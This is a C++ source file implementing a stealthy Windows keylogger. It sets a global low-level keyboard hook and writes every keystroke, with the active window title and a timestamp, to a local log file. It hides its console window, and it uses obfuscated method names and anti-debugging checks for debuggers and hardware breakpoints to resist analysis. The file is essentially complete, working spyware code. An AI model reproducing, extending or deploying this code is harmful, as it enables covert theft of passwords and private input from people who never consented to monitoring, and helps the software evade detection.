#include "../include/windowsLogger.h"
#include "../include/obfuscator.h"
#include "../include/antiDebug.h"

#include <iostream>
#include <sstream>
#include <stdexcept>
#include <chrono>
#include <iomanip>
#include <thread>
#include <fstream>

#if defined(_WIN32) || defined(_WIN64)
#include <Windows.h>
#endif

#if defined(_WIN32) || defined(_WIN64)

// Instance of the WindowsLogger. 
std::unique_ptr<WindowsLogger> WindowsLogger::instance = nullptr;

/**
 * @brief Construct a new Windows Logger:: Windows Logger object
 */
WindowsLogger::WindowsLogger()
{
    instance.reset(this);
    logFileName = "recordings.log";
    logFile.open(logFileName, std::ios_base::app);
    if (!logFile.is_open())
    {
        throw std::ios_base::failure("Unable to access log file. Check permissions.");
    }
}

/**
 * @brief Destroy the Windows Logger:: Windows Logger object
 */
WindowsLogger::~WindowsLogger()
{
    releaseHook();
    if (logFile.is_open())
    {
        logFile.close();
    }
}

/**
 * @brief This is the main entry point for the Windows keylogger.
 */
void WindowsLogger::startLogging()
{
    AntiDebug ad;
    Obfuscator ob;

    ob.registerMethod<bool>("zzzz", [&ad]() { return ad.isDebuggerPresent(); });
    if (ob.callMethod<bool>("zzzz"))
    {
        throw std::runtime_error("Debugger detected. Don't do this... :)");
    }

    ob.registerMethod<bool>("321", [&ad]() { return ad.checkForHardwareBreakpoints(); });
    if (ob.callMethod<bool>("321"))
    {
        throw std::runtime_error("Hardware breakpoints detected. Don't do this... :)");
    }

    hideConsole();

    if (isSystemBooting())
    {
        while (isSystemBooting())
        {
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
    }

    setKeyboardHook();

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {}
}

/**
 * @brief This is the callback function for the keyboard hook.
 * @param nCode -> The hook code.
 * @param wParam -> The message identifier.
 * @param lParam -> The pointer to the struct containing the key information.
 * @return LRESULT -> The result of the hook callback.
 */
LRESULT CALLBACK WindowsLogger::keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        instance->recordKeyStroke(kbdStruct->vkCode);
    }
    return CallNextHookEx(instance->hook, nCode, wParam, lParam);
}

/**
 * @brief This method will set the keyboard hook.
 */
void WindowsLogger::setKeyboardHook()
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookCallback, GetModuleHandle(nullptr), 0);
    if (!hook)
    {
        throw std::runtime_error("Failed to set keyboard hook.");
    }
}

/**
 * @brief This method will release the keyboard hook.
 */
void WindowsLogger::releaseHook()
{
    if (hook)
    {
        UnhookWindowsHookEx(hook);
    }
}

/**
 * @brief This method will record the key stroke.
 * @param keyStroke This is the key stroke to record.
 * @return int, 0 if successful, -1 if not.
 */
int WindowsLogger::recordKeyStroke(int keyStroke)
{
    std::stringstream output;
    static std::string lastWindow;

    if (keyStroke == 1 || keyStroke == 2)
    {
        return 0;
    }

    std::string currentWindow = getCurrentWindowName();
    if (currentWindow != lastWindow)
    {
        lastWindow = currentWindow;
        output << "\n\n[Window: " << currentWindow << " - at " << getCurrentTime() << "] ";
    }

    auto it = keyMap.find(keyStroke);
    if (it != keyMap.end())
    {
        output << it->second;
    }
    else
    {
        char key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), nullptr)));
        bool lowercase = !(GetKeyState(VK_CAPITAL) & 0x0001);

        if (GetKeyState(VK_SHIFT) & 0x8000)
        {
            lowercase = !lowercase;
        }

        if (lowercase)
        {
            key = std::tolower(key);
        }
        output << key;
    }

    logFile << output.str();
    logFile.flush();
    return 0;
}

/**
 * @brief This method will hide the console window.
 */
void WindowsLogger::hideConsole()
{
#ifdef VISIBLE_CONSOLE
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
#else
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
    FreeConsole();
#endif
}

/**
 * @brief This method retreives the name of the current window.
 * @return std::string -> This will be the name of the current window.
 */
std::string WindowsLogger::getCurrentWindowName() const
{
    HWND foreground = GetForegroundWindow();
    char windowTitle[256];
    GetWindowTextA(foreground, windowTitle, sizeof(windowTitle));
    return std::string(windowTitle);
}

/**
 * @brief This method will return the current time.
 * @return std::string -> This is the current time.
 */
std::string WindowsLogger::getCurrentTime() const
{
    auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::ostringstream oss;
    oss << std::put_time(std::localtime(&now), "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

/**
 * @brief This method will check if the system is booting.
 * @return true, if the system is booting.
 * @return false, if the system is not booting.
 */
bool WindowsLogger::isSystemBooting() const
{
    return GetSystemMetrics(SM_SHUTTINGDOWN) != 0;
}

/**
 * @brief This is the key map for the keylogger.
 */
const std::map<int, std::string> WindowsLogger::keyMap = {
    {VK_BACK, "[BACKSPACE]" }, {VK_RETURN, "\n" }, {VK_SPACE, " " }, {VK_TAB, "[TAB]" },
    {VK_SHIFT, "[SHIFT]" }, {VK_LSHIFT, "[LSHIFT]" }, {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL, "[CONTROL]" }, {VK_LCONTROL, "[LCONTROL]" }, {VK_RCONTROL, "[RCONTROL]" },
    {VK_MENU, "[ALT]" }, {VK_LWIN, "[LWIN]" }, {VK_RWIN, "[RWIN]" }, {VK_ESCAPE, "[ESCAPE]" },
    {VK_END, "[END]" }, {VK_HOME, "[HOME]" }, {VK_LEFT, "[LEFT]" }, {VK_RIGHT, "[RIGHT]" },
    {VK_UP, "[UP]" }, {VK_DOWN, "[DOWN]" }, {VK_PRIOR, "[PG_UP]" }, {VK_NEXT, "[PG_DOWN]" },
    {VK_OEM_PERIOD, "." }, {VK_DECIMAL, "." }, {VK_OEM_PLUS, "+" }, {VK_OEM_MINUS, "-" },
    {VK_ADD, "+" }, {VK_SUBTRACT, "-" }, {VK_CAPITAL, "[CAPSLOCK]" }
};
#endif
